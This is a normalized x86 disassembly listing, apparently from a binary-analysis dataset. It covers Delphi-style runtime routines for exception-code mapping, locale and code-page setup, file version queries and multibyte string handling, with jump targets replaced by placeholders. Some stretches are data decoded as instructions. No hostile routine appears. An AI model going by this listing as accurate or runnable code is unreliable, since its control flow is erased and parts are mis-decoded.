pop ebp
retn 0x4
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_40be44
push ebx
push esi
add esp 0xfffffff8
xor ebx ebx
call sub_402990
mov esi eax
jmp r-xdata
cmp ebx 0x6
jg r-xdata
cmp ebx 0x6
jg r-xdata
cmp esi [ ebx * 8 + rw-data ]
jne r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd3c
mov ecx [ ebx * 8 + rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc44
jmp r-xdata
inc ebx
mov [ eax + 0xc ] esi
pop ecx
pop edx
pop esi
pop ebx
retn
sub_40bea4
test al 0xbe
inc eax
add [ esi ] cl
or dl [ ebp + eax * 2 + 0x78 ]
arpl [ ebp + 0x70 ] sp
je r-xdata
pop es
arpl [ gs : eax ] cx
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah dh
adc [ eax ] al
add al 0x0
add [ eax ] al
push ebx
mov ebx edx
mov edx eax
dec dl
je r-xdata
mov edx [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
push ebx
mov eax edx
jmp sub_403b5c
mov edx [ rw-data ]
jmp r-xdata
dec edx
sub dl 0x16
jb r-xdata
and eax 0xff
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40bc44
mov edx eax
jmp r-xdata
jmp r-xdata
call sub_40be44
mov edx eax
sub_40bf18
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40bfb4
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406030
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_4041b8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0xb
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x2
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc80
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bfbb
lea eax [ ebp - 0x20 ]
call sub_404120
lea eax [ ebp - 0x4 ]
call sub_404120
retn
sub_40c008
mov eax [ eax ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0x6
retn
cmp eax 0xc000008e
jg r-xdata
mov al 0xe
retn
sub eax 0x3d
je r-xdata
mov al 0xc
retn
sub eax 0xc0000093
je r-xdata
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd
retn
jmp r-xdata
mov al 0x9
retn
dec eax
je r-xdata
je r-xdata
mov al 0x7
retn
sub eax 0xc0000005
je r-xdata
mov al 0x16
retn
mov al 0x3
retn
dec eax
je r-xdata
mov al 0x8
retn
jmp r-xdata
mov al 0xb
retn
sub eax 0x87
je r-xdata
mov al 0x5
retn
jmp r-xdata
mov al 0x4
retn
dec eax
je r-xdata
jmp r-xdata
sub_40c0a0
push ebp
mov ebp esp
add esp 0xfffffe90
push ebx
push esi
xor eax eax
mov [ ebp - 0x170 ] eax
mov [ ebp - 0x14c ] eax
mov [ ebp - 0x154 ] eax
mov [ ebp - 0x150 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40c25b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406030
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406030
jmp r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x16c ] eax
mov [ ebp - 0x168 ] 0x5
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x164 ] eax
mov [ ebp - 0x160 ] 0xb
mov [ ebp - 0x15c ] esi
mov [ ebp - 0x158 ] 0x5
lea eax [ ebp - 0x16c ]
push eax
push 0x2
lea edx [ ebp - 0x170 ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0x170 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc80
mov ebx eax
push 0x105
lea eax [ ebp - 0x125 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetModuleFileNameA
test eax eax
je r-xdata
mov esi [ ebx + 0x18 ]
push 0x1c
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call VirtualQuery
cmp [ ebp - 0x10 ] 0x1000
jne r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x144 ] 0x5
lea eax [ ebp - 0x150 ]
lea edx [ ebp - 0x125 ]
mov ecx 0x105
call sub_404390
mov eax [ ebp - 0x150 ]
lea edx [ ebp - 0x14c ]
call sub_408ae0
mov eax [ ebp - 0x14c ]
mov [ ebp - 0x140 ] eax
mov [ ebp - 0x13c ] 0xb
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x138 ] eax
mov [ ebp - 0x134 ] 0xb
mov [ ebp - 0x130 ] esi
mov [ ebp - 0x12c ] 0x5
lea eax [ ebp - 0x148 ]
push eax
push 0x3
lea edx [ ebp - 0x154 ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0x154 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc80
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c262
lea eax [ ebp - 0x170 ]
call sub_404120
lea eax [ ebp - 0x154 ]
mov edx 0x3
call sub_404144
lea eax [ ebp - 0x4 ]
call sub_404120
retn
sub_40c26c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40c327
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40c008
and eax 0xff
mov edx eax
add edx 0xfffffffd
sub edx 0x8
jb r-xdata
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40bc44
mov ebx eax
jmp r-xdata
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
push ebp
call sub_40c0a0
pop ecx
mov ebx eax
jmp r-xdata
dec edx
sub edx 0xa
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c32e
lea eax [ ebp - 0x10 ]
call sub_404120
retn
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc80
mov ebx eax
sub_40c348
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd00
mov [ rw-data ] eax
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd00
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] r-xdata
mov eax [ rw-data ]
mov [ eax ] sub_40c338
mov eax [ rw-data ]
mov edx [ r-xdata ]
mov [ eax ] edx
mov eax [ rw-data ]
mov [ eax ] sub_40c088
mov eax [ rw-data ]
mov [ eax ] sub_40c26c
mov eax sub_40bfd4
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40bff0
mov edx [ rw-data ]
mov [ edx ] eax
retn
sub_40c3cc
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx - 0x8 ]
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
retn
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
call sub_403390
xor eax eax
mov [ rw-data ] eax
sub_40c44c
add esp 0xffffff6c
mov [ esp ] 0x94
push esp
call GetVersionExA
test eax eax
je r-xdata
add esp 0x94
retn
mov eax [ esp + 0x10 ]
mov [ rw-data ] eax
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
mov eax [ esp + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ esp + 0xc ]
mov [ rw-data ] eax
mov eax [ esp + 0xc ]
and eax 0xffff
mov [ rw-data ] eax
jmp r-xdata
mov eax rw-data
lea edx [ esp + 0x14 ]
mov ecx 0x80
call sub_404390
sub_40c4dc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_40c5b2
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_4041b8
lea eax [ ebp - 0x8 ]
call j_sub_4045ec
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4045e0
push eax
call GetFileVersionInfoSizeA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c5b9
lea eax [ ebp - 0x8 ]
call sub_404120
retn
mov eax ebx
call sub_4027b4
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_40c595
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
push ebx
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4045e0
push eax
call GetFileVersionInfoA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_4027d4
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
call VerQueryValueA
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
sub_40c5c8
push esi
push edi
mov edi edx
xor edx edx
test eax eax
je r-xdata
mov eax edx
pop edi
pop esi
retn
cmp [ eax + edi ] 0x0
je r-xdata
test edi edi
jne r-xdata
mov esi edi
dec esi
jmp r-xdata
mov al [ eax ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
test esi esi
jl r-xdata
mov dl 0x1
jmp r-xdata
mov ecx edi
sub ecx esi
and ecx 0x80000001
jns r-xdata
mov cl [ eax + esi ]
and ecx 0xff
bt [ rw-data ] ecx
jb r-xdata
test ecx ecx
jne r-xdata
dec ecx
or ecx 0xfffffffe
inc ecx
dec esi
mov al [ eax + edi ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov dl 0x2
jmp r-xdata
mov dl 0x1
sub_40c640
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4045e0
mov edx esi
dec edx
call sub_40c5c8
sub_40c67c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4043e0
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_40c6a4
pop esi
pop ebx
retn
mov eax ebx
call sub_4043e0
mov esi eax
sub_40c6a4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor edi edi
test esi esi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4043e0
cmp esi eax
jg r-xdata
mov edi esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
xor edi edi
cmp esi eax
jl r-xdata
mov dl [ ebx + eax - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
inc eax
mov edx eax
mov eax ebx
call sub_40c8b4
jmp r-xdata
inc edi
cmp esi eax
jge r-xdata
sub_40c6fc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax edi
call sub_4043e0
mov [ ebp - 0xc ] eax
mov esi 0x1
mov ebx 0x1
jmp r-xdata
cmp ebx [ ebp - 0xc ]
jge r-xdata
cmp esi [ ebp - 0x4 ]
jne r-xdata
cmp esi [ ebp - 0x4 ]
jl r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] esi
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp ebx [ ebp - 0xc ]
jge r-xdata
inc esi
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc ebx
mov edx ebx
mov eax edi
call sub_40c8b4
mov ebx eax
jmp r-xdata
mov edx ebx
mov eax edi
call sub_40c8b4
dec eax
mov ebx eax
sub_40c78c
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_4043e0
cmp ebx eax
jg r-xdata
cmp ebx 0x1
jle r-xdata
mov [ esp ] ebx
cmp [ rw-data ] 0x0
je r-xdata
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
dec edx
mov eax esi
call sub_40c6fc
dec ebx
cmp ebx [ esp + 0x4 ]
jg r-xdata
xor eax eax
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_4043e0
cmp eax [ esp ]
jg r-xdata
inc [ esp ]
jmp r-xdata
sub_40c7f0
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_4043e0
cmp ebx eax
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax esi
call sub_4043e0
mov ebx eax
mov [ esp ] ebx
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
mov eax esi
call sub_40c6fc
mov eax esi
call sub_4043e0
cmp eax [ esp ]
jge r-xdata
mov eax esi
call sub_4043e0
mov [ esp ] eax
jmp r-xdata
sub_40c878
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x1
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ ebx + esi - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax ebx
call sub_4045e0
add eax esi
dec eax
call sub_40c850
sub_40c8b4
push ebx
push esi
mov ebx edx
mov esi eax
lea eax [ ebx + 0x1 ]
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax esi
call sub_4045e0
add eax ebx
dec eax
call sub_40c850
add eax ebx
sub_40c8f0
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_4043e0
cmp ebx eax
jg r-xdata
cmp [ esi + ebx - 0x1 ] 0x5c
jne r-xdata
mov edx ebx
mov eax esi
call sub_40c640
test al al
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_40c924
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx esi
call sub_404174
mov eax [ ebx ]
call sub_4043e0
mov edx eax
mov eax [ ebx ]
call sub_40c8f0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx r-xdata
call sub_4043e8
sub_40c964
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
xor edi edi
mov eax ebx
call sub_4045e0
push eax
mov eax esi
call sub_4045e0
mov ebp eax
mov eax ebp
pop edx
call sub_40ca28
mov ebx eax
test ebx ebx
je r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi ebx
sub edi ebp
inc edi
sub_40c99c
push ebx
push esi
push edi
push ebp
mov edi edx
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx edi
mov eax esi
call sub_40827c
mov eax esi
call sub_4043e0
mov ebp eax
mov eax edi
mov edx ebp
call sub_40476c
mov ebx 0x1
cmp ebp ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call j_sub_4045ec#2
mov dl [ esi + ebx - 0x1 ]
mov [ eax + ebx - 0x1 ] dl
mov al [ esi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ edi ]
mov al [ eax + ebx - 0x1 ]
add al 0xbf
sub al 0x1a
jae r-xdata
inc ebx
mov eax edi
call j_sub_4045ec#2
mov dl [ esi + ebx - 0x1 ]
mov [ eax + ebx - 0x1 ] dl
jmp r-xdata
inc ebx
cmp ebp ebx
jge r-xdata
mov eax edi
call j_sub_4045ec#2
add [ eax + ebx - 0x1 ] 0x20
jmp r-xdata
sub_40ca28
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
test ebp ebp
je r-xdata
cmp [ ebp ] 0x0
je r-xdata
mov eax esi
call sub_408c10
mov [ esp ] eax
mov eax ebp
call sub_408c10
mov edi eax
mov edx ebp
mov eax esi
call sub_408da8
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
xor ebx ebx
mov eax ebx
sub eax esi
mov edx [ esp ]
sub edx eax
cmp edi edx
jbe r-xdata
mov edx ebx
sub edx esi
mov eax esi
call sub_40c664
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x2
je r-xdata
cmp [ esp + 0x4 ] 0x1
jne r-xdata
push edi
push ebp
push edi
push ebx
push 0x0
push 0x400
call CompareStringA
cmp eax 0x2
je r-xdata
inc ebx
mov edx ebp
mov eax ebx
call sub_408da8
mov ebx eax
inc ebx
sub_40cac8
push ebx
push esi
mov ebx edx
mov edx ebx
call sub_40caf0
mov esi eax
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov esi eax
inc eax
mov edx ebx
call sub_40caf0
test eax eax
jne r-xdata
sub_40caf0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_408d94
mov edi eax
test edi edi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov edx edi
sub edx esi
mov eax esi
call sub_40c664
sub al 0x1
jb r-xdata
je r-xdata
inc edi
jmp r-xdata
inc edi
mov edx ebx
mov eax edi
call sub_408d94
mov edi eax
test edi edi
jne r-xdata
sub_40cb30
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
xor edx edx
push ebp
push sub_40cb94
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0x7 ]
push edx
push 0x1004
push eax
call GetLocaleInfoA
lea eax [ ebp - 0xc ]
lea edx [ ebp - 0x7 ]
mov ecx 0x7
call sub_404390
mov eax [ ebp - 0xc ]
push eax
call GetACP
mov edx eax
pop eax
call sub_408738
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cb9b
lea eax [ ebp - 0xc ]
call sub_404120
retn
sub_40cba4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xffffffec
push edi
mov eax [ rw-data ]
call sub_40cb30
push eax
call GetCPInfo
xor esi esi
jmp r-xdata
cmp esi 0xc
jge r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov al [ edi + esi + 0x6 ]
or al [ edi + esi + 0x7 ]
jne r-xdata
mov al [ edi + esi + 0x6 ]
mov bl [ edi + esi + 0x7 ]
sub bl al
jb r-xdata
add esi 0x2
inc ebx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
and eax 0xff
bts [ rw-data ] eax
inc [ ebp - 0x1 ]
dec bl
jne r-xdata
sub_40cc1c
push ebp
mov ebp esp
add esp 0xfffffe68
push ebx
push esi
push edi
mov [ rw-data ] 0x409
mov [ rw-data ] 0x9
mov [ rw-data ] 0x1
call GetThreadLocale
test eax eax
je r-xdata
test ax ax
je r-xdata
mov [ rw-data ] eax
mov esi r-xdata
mov edi rw-data
mov ecx 0x8
[ edi ] [ esi ]
cmp [ rw-data ] 0x2
jne r-xdata
mov edx eax
and dx 0x3ff
movzx edx dx
mov [ rw-data ] edx
movzx eax ax
shr eax 0xa
mov [ rw-data ] eax
push 0x4a
call GetSystemMetrics
test eax eax
setne al
mov [ rw-data ] al
push 0x2a
call GetSystemMetrics
test eax eax
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
call sub_40cc04
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_40cba4
pop ecx
push ebp
call sub_40cba4
pop ecx
mov eax rw-data
mov edx r-xdata
mov cl 0x20
call sub_402ec8
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
jmp r-xdata
mov eax 0x80
lea edx [ ebp - 0x94 ]
mov [ rw-data ] 0x0
jmp r-xdata
mov [ edx ] al
inc eax
inc edx
cmp eax 0x100
jne r-xdata
lea eax [ ebp - 0x94 ]
lea edx [ ebp - 0x196 ]
push edx
push 0x80
push eax
push 0x2
mov eax [ rw-data ]
push eax
call GetStringTypeExA
mov eax 0x80
lea edx [ ebp - 0x196 ]
add edx 0x2
dec eax
jne r-xdata
cmp [ edx ] 0x2
sete cl
mov [ rw-data ] cl
test cl cl
jne r-xdata
jmp r-xdata
sub_40cd90
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
xor eax eax
push ebp
push sub_40d05b
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_40cc1c
call sub_40b52c
cmp [ rw-data ] 0x0
je r-xdata
call GetThreadLocale
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
xor ecx ecx
mov edx 0x14
mov eax ebx
call sub_40b47c
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_404174
lea eax [ ebp - 0x14 ]
push eax
mov ecx r-xdata
mov edx 0x1b
mov eax ebx
call sub_40b47c
mov eax [ ebp - 0x14 ]
xor edx edx
call sub_408738
mov [ rw-data ] al
lea eax [ ebp - 0x18 ]
push eax
mov ecx r-xdata
mov edx 0x1c
mov eax ebx
call sub_40b47c
mov eax [ ebp - 0x18 ]
xor edx edx
call sub_408738
mov [ rw-data ] al
mov cl 0x2c
mov edx 0xf
mov eax ebx
call sub_40b4c8
mov [ rw-data ] al
mov cl 0x2e
mov edx 0xe
mov eax ebx
call sub_40b4c8
mov [ rw-data ] al
lea eax [ ebp - 0x1c ]
push eax
mov ecx r-xdata
mov edx 0x19
mov eax ebx
call sub_40b47c
mov eax [ ebp - 0x1c ]
xor edx edx
call sub_408738
mov [ rw-data ] al
mov cl 0x2f
mov edx 0x1d
mov eax ebx
call sub_40b4c8
mov [ rw-data ] al
lea eax [ ebp - 0x24 ]
push eax
mov ecx r-xdata
mov edx 0x1f
mov eax ebx
call sub_40b47c
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0x20 ]
call sub_40b7b4
mov edx [ ebp - 0x20 ]
mov eax rw-data
call sub_404174
lea eax [ ebp - 0x2c ]
push eax
mov ecx r-xdata
mov edx 0x20
mov eax ebx
call sub_40b47c
mov eax [ ebp - 0x2c ]
lea edx [ ebp - 0x28 ]
call sub_40b7b4
mov edx [ ebp - 0x28 ]
mov eax rw-data
call sub_404174
mov cl 0x3a
mov edx 0x1e
mov eax ebx
call sub_40b4c8
mov [ rw-data ] al
lea eax [ ebp - 0x30 ]
push eax
mov ecx r-xdata
mov edx 0x28
mov eax ebx
call sub_40b47c
mov edx [ ebp - 0x30 ]
mov eax rw-data
call sub_404174
lea eax [ ebp - 0x34 ]
push eax
mov ecx r-xdata
mov edx 0x29
mov eax ebx
call sub_40b47c
mov edx [ ebp - 0x34 ]
mov eax rw-data
call sub_404174
lea eax [ ebp - 0x8 ]
call sub_404120
lea eax [ ebp - 0xc ]
call sub_404120
lea eax [ ebp - 0x38 ]
push eax
mov ecx r-xdata
mov edx 0x25
mov eax ebx
call sub_40b47c
mov eax [ ebp - 0x38 ]
xor edx edx
call sub_408738
test eax eax
jne r-xdata
call sub_40b704
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4041b8
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4041b8
jmp r-xdata
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_4044a0
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_4044a0
mov cl 0x2c
mov edx 0xc
mov eax ebx
call sub_40b4c8
mov [ rw-data ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d062
lea eax [ ebp - 0x40 ]
mov edx 0x10
call sub_404144
retn
lea eax [ ebp - 0x40 ]
push eax
mov ecx r-xdata
mov edx 0x1005
mov eax ebx
call sub_40b47c
mov eax [ ebp - 0x40 ]
xor edx edx
call sub_408738
test eax eax
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
mov ecx r-xdata
mov edx 0x23
mov eax ebx
call sub_40b47c
mov eax [ ebp - 0x3c ]
xor edx edx
call sub_408738
test eax eax
jne r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4041b8
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4041b8
jmp r-xdata
sub_40d108
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_40d22b
push [ fs : eax ]
mov [ fs : eax ] esp
test [ ebp + 0xc ] 0x2
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_4041b8
lea eax [ ebp - 0xc ]
mov edx edi
call sub_4041b8
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_408248
lea edx [ ebp - 0xc ]
mov eax edi
call sub_408248
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx ebx
call sub_4041b8
mov eax esi
call sub_404120
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_40c964
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d232
lea eax [ ebp - 0x14 ]
mov edx 0x4
call sub_404144
retn
push [ esi ]
lea eax [ ebp - 0x14 ]
push eax
mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ ebp - 0x10 ]
call sub_404640
push [ ebp - 0x14 ]
push [ ebp - 0x4 ]
mov eax esi
mov edx 0x3
call sub_4044a0
lea eax [ ebp - 0x10 ]
push eax
mov eax edi
call sub_4043e0
mov edx eax
add edx ebx
mov ecx 0x7fffffff
mov eax [ ebp - 0x10 ]
call sub_404640
test [ ebp + 0xc ] 0x1
jne r-xdata
mov eax esi
mov edx [ ebp - 0x10 ]
call sub_4043e8
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
call sub_4043e0
mov edx eax
add edx ebx
mov ecx 0x7fffffff
mov eax [ ebp - 0x8 ]
call sub_404640
mov eax esi
mov edx [ ebp - 0x10 ]
call sub_4043e8
jmp r-xdata
sub_40d244
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_40d2d4
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd00
mov edx eax
mov [ ebp - 0x10 ] ebx
